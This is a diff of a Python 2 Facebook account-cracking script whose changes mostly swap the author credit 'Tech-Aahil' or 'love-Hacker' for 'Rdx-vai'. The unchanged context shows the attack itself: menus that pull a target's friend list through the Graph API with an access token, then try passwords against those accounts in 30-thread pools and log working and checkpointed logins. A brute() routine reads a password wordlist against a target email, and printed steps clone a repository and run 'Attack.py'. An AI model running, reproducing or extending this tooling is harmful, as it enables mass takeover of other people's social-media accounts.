                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No14⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No15⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No16⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No17⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No18⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No19⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No20⭕')
                 jalan('\033[1;97mapt update')
                 jalan('\033[1;97mapt upgrade -y ')
                 jalan('\033[1;97mpkg install python -y ')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
                 jalan('\033[1;97m#Metasploit Commands')
@@ -11266,7 +11266,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;97m[+] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
+		print "\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -11324,7 +11324,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -11432,8 +11432,8 @@ def pilih_crack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" ##Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" ##Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (Back)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -11480,10 +11480,10 @@ _'▀█║────────────▄▄─────────
  Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m ....Tech-Aahil....... \033[1;97m :
+: \033[1;97m ....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -11514,7 +11514,7 @@ def pilih_hack():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -11552,7 +11552,7 @@ def pilih_hack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -11663,8 +11663,8 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -11703,10 +11703,10 @@ def pilih_hack():
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m ....Tech-Aahil....... \033[1;97m :
+: \033[1;97m ....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -11737,7 +11737,7 @@ def pilih_black():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -11775,7 +11775,7 @@ def pilih_black():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -11886,8 +11886,8 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -11914,10 +11914,10 @@ def pilih_black():
  Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m ...Tech-Aahil....... \033[1;97m :
+: \033[1;97m ...Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -11948,7 +11948,7 @@ def pilih_mafia():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -11986,7 +11986,7 @@ def pilih_mafia():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -12096,8 +12096,8 @@ def pilih_mafia():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Attack.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -12134,10 +12134,10 @@ _____¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶__________¶¶¶¶¶_______
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....Tech-Aahil....... \033[1;97m :
+: \033[1;97m .....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97mAahil"""
+              \033[1;97mRdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -12168,7 +12168,7 @@ def pilih_test():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -12206,7 +12206,7 @@ def pilih_test():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -12316,8 +12316,8 @@ def pilih_test():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -12353,10 +12353,10 @@ ________________$$$$__________________$$$$
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....Tech-Aahil....... \033[1;97m :
+: \033[1;97m .....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -12387,7 +12387,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		uty = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
 			hh = json.loads(kk.text)
@@ -12425,7 +12425,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass#Dev:Tech-Aahil
+			pass#Dev:Rdx-vai
 		try:
 			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			l = json.loads(a.text)
@@ -12533,8 +12533,8 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»"#Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»"#Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -12565,10 +12565,10 @@ def pilih_super():
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....Tech-Aahil....... \033[1;97m :
+: \033[1;97m .....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -12662,7 +12662,7 @@ def brute():
         print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
         try:
             email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
-            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type Aahil.txt) \x1b[1;91m: \x1b[1;97m')
+            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type Rdx-vai.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
             print '\033[1;97m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
@@ -12825,7 +12825,7 @@ def pilih_phone():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Tech-Aahil
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -12935,8 +12935,8 @@ def pilih_phone():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -12964,10 +12964,10 @@ def pilih_phone():
  Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....Tech-Aahil....... \033[1;97m :
+: \033[1;97m .....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -12998,7 +12998,7 @@ def pilih_mail():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -13036,7 +13036,7 @@ def pilih_mail():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -13146,8 +13146,8 @@ def pilih_mail():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -13189,7 +13189,7 @@ def isi():
 		login()
 	os.system('clear')
 	print logo17
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Tech-Aahil."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Rdx-vai."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mBack"
 	pilih_isi()
@@ -13203,7 +13203,7 @@ def pilih_isi():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -13241,7 +13241,7 @@ def pilih_isi():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx-vai
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -13351,8 +13351,8 @@ def pilih_isi():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Tech-Aahil
